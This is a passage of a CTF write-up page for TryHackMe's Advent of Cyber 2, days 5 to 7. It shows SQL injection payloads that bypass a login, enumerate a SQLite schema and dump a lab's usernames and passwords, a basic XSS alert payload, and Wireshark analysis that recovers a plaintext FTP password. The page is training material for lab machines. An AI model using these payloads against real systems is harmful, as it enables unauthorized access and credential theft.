class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="getting-the-flag-1">Getting the flag<a href="#getting-the-flag-1" class="hash-link" aria-label="Direct link to Getting the flag" title="Direct link to Getting the flag">​</a></h3><p>Now that we know where to find the flag, we can simply use cURL to actually get the flag:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">curl http://10.10.252.228/api/site-log.php?date=20201125</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Flag: <code>THM{D4t3_AP1}</code></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="day-5-someone-stole-santas-gift-list">Day 5: Someone stole Santa&#x27;s gift list!<a href="#day-5-someone-stole-santas-gift-list" class="hash-link" aria-label="Direct link to Day 5: Someone stole Santa&#x27;s gift list!" title="Direct link to Day 5: Someone stole Santa&#x27;s gift list!">​</a></h2><p><em>Category: Web Exploitation</em><br>
<em>Tags: SQL injection, PHP</em>  </p><blockquote><p>Learn to detect and exploit one of the most dangerous web vulnerabilities!</p></blockquote><p>IP: <code>10.10.220.236</code><br>
<!-- -->Port: <code>8000</code></p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="without-using-directory-brute-forcing-whats-santas-secret-login-panel">Without using directory brute forcing, what&#x27;s Santa&#x27;s secret login panel?<a href="#without-using-directory-brute-forcing-whats-santas-secret-login-panel" class="hash-link" aria-label="Direct link to Without using directory brute forcing, what&#x27;s Santa&#x27;s secret login panel?" title="Direct link to Without using directory brute forcing, what&#x27;s Santa&#x27;s secret login panel?">​</a></h3><p>Using the hint, we know that the panel is located at <code>/santapanel</code></p><p><img loading="lazy" alt="screenshot" src="/assets/images/panel_login-c655156ffb1bfb50be28e679e149b1f6.png" width="1846" height="847" class="img_ev3q"></p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="bypass-the-login-using-sql-injection">Bypass the login using SQL injection<a href="#bypass-the-login-using-sql-injection" class="hash-link" aria-label="Direct link to Bypass the login using SQL injection" title="Direct link to Bypass the login using SQL injection">​</a></h3><p>Visiting <code>10.10.220.236:8000/santapanel</code>, we see there is a login page which I assumed to be vulnerable to SQLi. Therefore, I tried the following payload and sure enough, I was able to gain access to the santapanel</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">&#x27; OR 1==1;--</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>The full SQL command would then look something like this:</p><div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">SELECT</span><span class="token plain"> </span><span class="token operator">*</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">FROM</span><span class="token plain"> some_table </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">WHERE</span><span class="token plain"> username</span><span class="token operator">=</span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;&#x27;</span><span class="token plain"> </span><span class="token operator">OR</span><span class="token plain"> </span><span class="token number">1</span><span class="token operator">=</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token comment" style="color:rgb(98, 114, 164)">-- AND password=&#x27;&#x27;;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>As you can see, every entry in this tabble will be returned even if the username doesn&#x27;t match since 1==1 always evaluates to true.</p><p><img loading="lazy" alt="screenshot" src="/assets/images/panel_page-f6012942962540e56167349f8adf5fbd.png" width="1843" height="842" class="img_ev3q"></p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="how-many-entries-are-there-in-the-gift-database">How many entries are there in the gift database?<a href="#how-many-entries-are-there-in-the-gift-database" class="hash-link" aria-label="Direct link to How many entries are there in the gift database?" title="Direct link to How many entries are there in the gift database?">​</a></h3><p>We can supply a wildcard character (<code>%</code>) to select every entry into the database. If we count them, we see that we have 22 entries.</p><p>We also see that <code>Paul</code> asked for <code>github ownership</code>.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="finding-the-flag">Finding the flag<a href="#finding-the-flag" class="hash-link" aria-label="Direct link to Finding the flag" title="Direct link to Finding the flag">​</a></h3><p>First we need to find the table names and their schema. We do so using the following SQLi payload to union the tbl_name and sql fields from the sqlite_master table:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">%&#x27; UNION SELECT tbl_name, sql FROM sqlite_master;--</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Which expands to the following:</p><div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">SELECT</span><span class="token plain"> gift</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> child </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">FROM</span><span class="token plain"> some_table </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">WHERE</span><span class="token plain"> gift </span><span class="token operator">LIKE</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;%&#x27;</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">UNION</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">SELECT</span><span class="token plain"> tbl_name</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">sql</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">FROM</span><span class="token plain"> sqlite_master</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token comment" style="color:rgb(98, 114, 164)">--;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>We get the following result:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">hidden_table | CREATE TABLE hidden_table (flag text)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sequels | CREATE TABLE sequels (title text, kid text, age integer)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">users | CREATE TABLE users (username text, password text)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>To get the flag, we can use the following SQLi payload</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">%&#x27; UNION SELECT 1, flag FROM hidden_table;--</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Which expands to the following:</p><div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">SELECT</span><span class="token plain"> gift</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> child </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">FROM</span><span class="token plain"> some_table </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">WHERE</span><span class="token plain"> gift </span><span class="token operator">LIKE</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;%&#x27;</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">UNION</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">SELECT</span><span class="token plain"> </span><span class="token number">1</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> flag </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">FROM</span><span class="token plain"> hidden_table</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token comment" style="color:rgb(98, 114, 164)">--;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Then we find the flag in the table.</p><p>Flag: <code>thmfox{All_I_Want_for_Christmas_Is_You}</code></p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="getting-the-admin-password">Getting the admin password<a href="#getting-the-admin-password" class="hash-link" aria-label="Direct link to Getting the admin password" title="Direct link to Getting the admin password">​</a></h3><p>Once again, we use a SQLi payload.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">%&#x27; UNION SELECT username, password FROM users;--</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>In the table we can find the admin&#x27;s password.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">admin:EhCNSWzzFP6sc7gB</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="day-6-be-careful-with-what-you-wish-on-a-christmas-night">Day 6: Be careful with what you wish on a Christmas night<a href="#day-6-be-careful-with-what-you-wish-on-a-christmas-night" class="hash-link" aria-label="Direct link to Day 6: Be careful with what you wish on a Christmas night" title="Direct link to Day 6: Be careful with what you wish on a Christmas night">​</a></h2><p><em>Category: Web Exploitation</em><br>
<em>Tags: JavaScript</em>  </p><blockquote><p>Get familiar with compromising user interactions with vulnerable applications by executing custom javascript code.</p></blockquote><p>IP: <code>10.10.157.100</code><br>
<!-- -->Port: <code>5000</code></p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="finding-the-cross-site-scripting">Finding the cross-site scripting<a href="#finding-the-cross-site-scripting" class="hash-link" aria-label="Direct link to Finding the cross-site scripting" title="Direct link to Finding the cross-site scripting">​</a></h3><p><img loading="lazy" alt="screenshot" src="/assets/images/make_a_wish-52a321a786eca2925a742b0b5b2b035e.png" width="1848" height="847" class="img_ev3q"></p><h4 class="anchor anchorWithStickyNavbar_LWe7" id="stored-cross-site-scripting">Stored cross-site scripting<a href="#stored-cross-site-scripting" class="hash-link" aria-label="Direct link to Stored cross-site scripting" title="Direct link to Stored cross-site scripting">​</a></h4><p>Found in the <code>enter a wish here</code> box.</p><p><img loading="lazy" alt="screenshot" src="/assets/images/stored_xss-23500120e4f54e61f5106a775d54257d.png" width="1847" height="848" class="img_ev3q"></p><h4 class="anchor anchorWithStickyNavbar_LWe7" id="reflected-cross-site-scripting">Reflected cross-site scripting<a href="#reflected-cross-site-scripting" class="hash-link" aria-label="Direct link to Reflected cross-site scripting" title="Direct link to Reflected cross-site scripting">​</a></h4><p>Found in the <code>search query</code> box.</p><p><img loading="lazy" alt="screenshot" src="/assets/images/reflected_xss-ba8373813d935acc1ba67e0b79cef76d.png" width="1849" height="849" class="img_ev3q"></p><h4 class="anchor anchorWithStickyNavbar_LWe7" id="how-to-exploit">How to exploit?<a href="#how-to-exploit" class="hash-link" aria-label="Direct link to How to exploit?" title="Direct link to How to exploit?">​</a></h4><p>Type the following payload into either of them to see a cross-site scripting pop-up:</p><div class="language-html codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-html codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&lt;</span><span class="token tag" style="color:rgb(255, 121, 198)">script</span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&gt;</span><span class="token script language-javascript function" style="color:rgb(80, 250, 123)">alert</span><span class="token script language-javascript punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token script language-javascript string" style="color:rgb(255, 121, 198)">&quot;XSS&quot;</span><span class="token script language-javascript punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token script language-javascript punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&lt;/</span><span class="token tag" style="color:rgb(255, 121, 198)">script</span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="getting-the-flag-2">Getting the flag<a href="#getting-the-flag-2" class="hash-link" aria-label="Direct link to Getting the flag" title="Direct link to Getting the flag">​</a></h3><p>Well unfortunately, there is no flag for this challenge. So here&#x27;s a fake flag that I made!</p><p><img loading="lazy" alt="screenshot" src="/assets/images/fake_flag-d26994091feab002d963b632c0e33929.png" width="1847" height="842" class="img_ev3q"></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="day-7-the-grinch-really-did-steal-christmas">Day 7: The Grinch Really Did Steal Christmas<a href="#day-7-the-grinch-really-did-steal-christmas" class="hash-link" aria-label="Direct link to Day 7: The Grinch Really Did Steal Christmas" title="Direct link to Day 7: The Grinch Really Did Steal Christmas">​</a></h2><blockquote><p>Understand a few of the technologies that power the internet! Use this knowledge to track the activity of the Grinch who stole christmas!</p></blockquote><p><em>Category: Networking</em><br>
<em>Tags: Wireshark, Packet Analysis</em>  </p><p>File: <a href="/writeups/Tryhackme/Advent of Cyber 2/day07-the-grinch-really-did-steal-christmas/aoc.pcaps.zip/">aoc-pcaps.zip</a><br>
<!-- -->Prerequesite Software: Wireshark  </p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="unzipping">Unzipping<a href="#unzipping" class="hash-link" aria-label="Direct link to Unzipping" title="Direct link to Unzipping">​</a></h3><p>Before we begin, we must unzip the file as follows:</p><div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">cd day07-the-grinch-really-did-steal-christmas/</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">unzip aoc-pcaps.zip</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>And we see that there are 3 <code>.pcap</code> files:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">Archive:  aoc-pcaps.zip</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  inflating: pcap1.pcap              </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  inflating: pcap2.pcap              </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  inflating: pcap3.pcap </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="pcap1pcap">pcap1.pcap<a href="#pcap1pcap" class="hash-link" aria-label="Direct link to pcap1.pcap" title="Direct link to pcap1.pcap">​</a></h3><h4 class="anchor anchorWithStickyNavbar_LWe7" id="open-pcap1pcap-in-wireshark-what-is-the-ip-address-that-initiates-an-icmpping">Open &quot;pcap1.pcap&quot; in Wireshark. What is the IP address that initiates an ICMP/ping?<a href="#open-pcap1pcap-in-wireshark-what-is-the-ip-address-that-initiates-an-icmpping" class="hash-link" aria-label="Direct link to Open &quot;pcap1.pcap&quot; in Wireshark. What is the IP address that initiates an ICMP/ping?" title="Direct link to Open &quot;pcap1.pcap&quot; in Wireshark. What is the IP address that initiates an ICMP/ping?">​</a></h4><p>We open pcap1.pcap in Wireshark and look for the source IP of the ping request.</p><p><img loading="lazy" alt="screenshot" src="/assets/images/pcap1_ping-daa2e072a35c5d146a787e1b4b409676.png" width="1850" height="395" class="img_ev3q"></p><p>We see that <code>10.11.3.2</code> is pinging <code>10.10.15.52</code>.</p><h4 class="anchor anchorWithStickyNavbar_LWe7" id="filtering-to-see-http-get-requests">Filtering to see HTTP GET requests<a href="#filtering-to-see-http-get-requests" class="hash-link" aria-label="Direct link to Filtering to see HTTP GET requests" title="Direct link to Filtering to see HTTP GET requests">​</a></h4><p>The <code>http.request.method == get</code> filter can be used to only see the HTTP GET requests.  </p><p>We can use this filter (<code>http.request.method == GET &amp;&amp; ip.src == 10.10.67.199</code>) to further narrow it down as needed.  </p><p>Sifting through the packets, we can see that <code>10.10.67.199</code> read <code>reindeer-of-the-week</code>.  </p><p><img loading="lazy" alt="screenshot" src="/assets/images/reindeer-of-the-week-c6caa76f8cd2e895a5c379d824c69e6e.png" width="1847" height="949" class="img_ev3q"></p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="pcap2pcap">pcap2.pcap<a href="#pcap2pcap" class="hash-link" aria-label="Direct link to pcap2.pcap" title="Direct link to pcap2.pcap">​</a></h3><h4 class="anchor anchorWithStickyNavbar_LWe7" id="find-the-password-used-for-ftp">Find the password used for FTP<a href="#find-the-password-used-for-ftp" class="hash-link" aria-label="Direct link to Find the password used for FTP" title="Direct link to Find the password used for FTP">​</a></h4><p>We filter the traffic by using the protocol <code>FTP</code>.  </p><p><img loading="lazy" alt="screenshot" src="/assets/images/finding_password-65ba27c5ff2e0d81794b415c80279173.png" width="1848" height="529" class="img_ev3q"></p><p>Then we can follow the TCP stream to find the password.  </p><p><img loading="lazy" alt="screenshot" src="/assets/images/follow_ftp_tcp-d05977a9bf0f8c98472c836de0b0d876.png" width="1234" height="306" class="img_ev3q"></p><p>The leaked password is: <code>plaintext_password_fiasco</code>  </p><h4 class="anchor anchorWithStickyNavbar_LWe7" id="what-is-the-name-of-the-protocol-that-is-encrypted">What is the name of the protocol that is encrypted?<a href="#what-is-the-name-of-the-protocol-that-is-encrypted" class="hash-link" aria-label="Direct link to What is the name of the protocol that is encrypted?" title="Direct link to What is the name of the protocol that is encrypted?">​</a></h4><p>Looking at the wireshark, we can see the SSH protocol which is encrypted.</p><p><img loading="lazy" alt="screenshot" src="/assets/images/ssh-c3c251142ee67ab1c0ef09286dee8e45.png" width="1847" height="391" class="img_ev3q"></p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="pcap3pcap">pcap3.pcap<a href="#pcap3pcap" class="hash-link" aria-label="Direct link to pcap3.pcap" title="Direct link to pcap3.pcap">​</a></h3><p>Looking through wireshark, we see a lot of SSH and HTTP traffic. Since SSH is encrypted, the HTTP is more interesting. We see that there is downloading of files specifically a <code>christmas.zip</code> file, so we extract that and save it onto out machine for further investigation.</p><p><img loading="lazy" alt="screenshot" src="/assets/images/export_objects-a9ff931a5bae841a290105c3e4e59505.png" width="1848" height="516" class="img_ev3q"></p><p><img loading="lazy" alt="screenshot" src="/assets/images/http_object_list-ada0559d693b5e761f7b7f2e12a20fd7.png" width="753" height="556" class="img_ev3q"></p><p>Then we can unzip <code>christmas.zip</code>. We find the following files:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code 